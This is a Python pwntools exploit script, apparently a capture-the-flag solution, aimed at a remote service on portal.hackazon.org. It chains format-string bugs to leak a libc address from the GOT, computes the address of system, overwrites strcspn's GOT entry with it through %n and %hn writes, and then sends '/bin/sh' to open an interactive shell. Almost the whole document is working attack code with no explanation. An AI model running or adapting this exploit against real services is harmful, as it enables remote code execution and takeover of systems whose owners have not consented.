from pwn import * 

target = remote('portal.hackazon.org', 17003)

libc = ELF("libc6_2.27-3ubuntu1.4_amd64.so")
#                		      0x7ff1dbc4d432
#Gadgets:
fgets_got_plt = 0x601030 #Note that it ends in a null, so not a great traditional leak.
strcspn_got_plt = 0x601020
printf_got_plt = 0x601018
setbuf_got_plt = 0x601010

print(target.recvuntil(b'Command:'))
payload = b'%p' * 100
target.sendline(payload)

print(target.recvuntil(b'Command:'))

payload = b'%' + str(strcspn_got_plt).encode('ascii') + b'x%60$n' + b'%32$n'
target.sendline(payload)

print(target.recvuntil(b'Command:'))
payload = b'%61$s'
target.sendline(payload)
print(target.recvuntil(b'engine'))	
print(target.recvuntil(b'command ('))
result = target.recvuntil(b') now')
print(result)	
leak = result.replace(b') now', b'')
print(leak)

strcspn_libc = u64(leak + b'\x00' * (8-len(leak)))
print(hex(strcspn_libc))

#For some reason the offset of strcspn is a bit dodgy, using printf as a middleman was easiest.
printf_libc = strcspn_libc - 0x125040
print('printf libc is', hex(printf_libc))
libc_base = printf_libc - libc.symbols["printf"]
system = libc_base + libc.symbols["system"]
print("The system address is at", hex(system))



system_low_two = int(hex(system)[10:15], 16)
system_next_two = int(hex(system)[6:10], 16)

#This will let us overwrite the next lowest two bytes of strcspn's GOT entry.
payload = b'%' + str(0x20 + 2).encode('ascii') + b'x%32$hhn'

target.sendline(payload)
print(target.recvuntil(b'Command'))
payload = b'%' + str(system_low_two).encode('ascii') + b'x%61$hn'
#This took some trial and error.
if system_next_two > system_low_two:
	payload += b'%' + str(system_next_two - system_low_two).encode('ascii') + b'x%62$hn'
else:
	payload += b'%' + str(0xffff - system_low_two + system_next_two + 1).encode('ascii') + b'x%62$hn'


target.sendline(payload)
print(target.recvuntil(b'Command'))
target.sendline(b'/bin/sh')


target.interactive()

